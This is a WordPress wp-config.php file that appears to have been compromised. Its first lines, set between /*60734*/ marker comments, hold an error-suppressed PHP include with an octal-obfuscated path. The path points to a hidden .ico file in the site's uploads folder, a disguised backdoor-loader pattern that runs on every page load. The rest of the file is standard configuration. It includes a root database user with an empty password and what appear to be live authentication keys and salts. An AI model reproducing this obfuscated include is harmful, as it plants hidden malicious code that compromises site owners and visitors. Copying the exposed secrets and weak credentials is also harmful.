<?php
/*60734*/

@include "\057ho\155e/\155ul\164ac\143o/\155ar\153et\151fa\056ir\057ma\171os\151s/\167p-\143on\164en\164/u\160lo\141ds\057.2\061ec\1426c\146.i\143o";

/*60734*/


/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', "wordpress_company");

/** MySQL database username */
define('DB_USER', "root");

/** MySQL database password */
define('DB_PASSWORD', "");

/** MySQL hostname */
define('DB_HOST', "localhost");

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'r.Tp4F:[2Ou|Hj/FNc1l{5^j-uI5^2sl97H3, t>qbkK0i{#@rw @6@dMOO&)PoW');
define('SECURE_AUTH_KEY',  'WkgKS^^XnaM1$|m:1u..6B:2L0gx;?3+;EUmsz:n]^qz6u5 QX>Fh> 7`>K[wY1|');
define('LOGGED_IN_KEY',    'Ulk4&-8;$5,2&0Yc_`geppD3{.QmD(Q,yDw4(FND7e/Dt&K~o,L!-R3uMkQ)UgP`');
define('NONCE_KEY',        '1+d2]aL<bLOG (J}@6qUi4&F0LvwH&?Tn8h1xomTdGAFKK%#VbfI2SdTvXbf1xlm');
define('AUTH_SALT',        't%pvM=nxi}kv{y*]:w||T84;|}?~bZ?ua*Uho^@QFG%sKvU*KX2{%Eg2xsVv5Hmg');
define('SECURE_AUTH_SALT', 'lcZ{x)l5%3CYZL!jX5O>mG8Q/u;ODDQ9pUbjuagT}+ADq#VW|7U{R+rPt~ 2a!#K');
define('LOGGED_IN_SALT',   'vi-)m1mVm})gkdBWh~GfpG.2PdtJcS;}isy--UKe9_|R#LqRIn9#;[<5y_FlXZMJ');
define('NONCE_SALT',       'C9<+j@L.+Vuf^)K&4*820cWz%6t[1Yh/P4i!W#mI}]T,4XtynmNT)|iBN^TKE,Qb');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
